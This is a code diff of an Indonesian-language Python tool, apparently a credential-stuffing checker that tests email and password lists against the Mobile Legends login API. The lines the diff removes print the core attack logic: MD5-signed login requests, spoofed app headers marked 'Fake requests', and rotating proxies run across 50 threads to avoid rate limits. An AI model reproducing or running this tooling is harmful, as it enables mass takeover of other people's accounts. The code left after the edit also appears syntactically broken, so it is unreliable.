@@ -54,7 +54,6 @@ class MOONTON:
     self.wrong_email = []
     self.limit_login = []
     self.unknown = []
-    self.proxy_list = []
     self.api = url
     self.loop = 0
     print('''\033[0m
@@ -187,24 +186,7 @@ class MOONTON:
           )
         )
       )
-      ask = input(
-        '[?] Apakah ingin menggunakan proxy?(\033[92mDisarankan\033[0m) [Y/t]: '
-      )
-      if ask.lower(
-      ).strip(
-      ) == 'y':
-        self.valid_proxy = proxy.prox(
-        )
-        with ThreadPoolExecutor(
-          max_workers=50
-        ) as thread:
-          [
-            thread.submit(
-              self.validate,
-              user,
-              True
-            ) for user in self.userdata
-          ]
+      
       else:
         print(
           ''
@@ -266,68 +248,7 @@ class MOONTON:
       )
     else: print(
       '[!] File tidak ditemukan "{0}"'.format(
-        empas
-      )
-    )
-
-  def hash_md5(self, string):
-    md5 = hashlib.new(
-      'md5'
-    )
-    md5.update(
-      string.encode(
-        'utf-8'
-      )
-    )
-    return md5.hexdigest(
-    )
-
-  def build_params(self, user):
-    md5pwd = self.hash_md5(
-      user[
-        'pw'
-      ]
-    )
-    hashed = self.hash_md5(
-      'account={0}&md5pwd={1}&op=login'.format(
-        user[
-          'email'
-        ],
-        md5pwd
-      )
-    )
-    return json.dumps({
-      'op': 'login',
-      'sign': hashed,
-      'params': {
-        'account': user[
-          'email'
-        ],
-        'md5pwd': md5pwd,
-      },
-      'lang': 'cn'
-    })
-  
-  def validate(self, user, with_porxy):
-    try:
-      data = self.build_params(
-        user
-      )
-      headers = {
-        'host': 'accountmtapi.mobilelegends.com',
-        'user-agent': 'Mozilla/5.0',
-        'x-requested-with': 'com.mobile.legends' # Fake requests
-      }
-      if with_porxy == True:
-        proxy = random.choice(
-          self.valid_proxy
-        )
-        response = requests.post(
-          self.api,
-          data=data,
-          headers=headers,
-          proxies=proxy,
-          timeout=10
+        
         )
       else:
         response = requests.post(
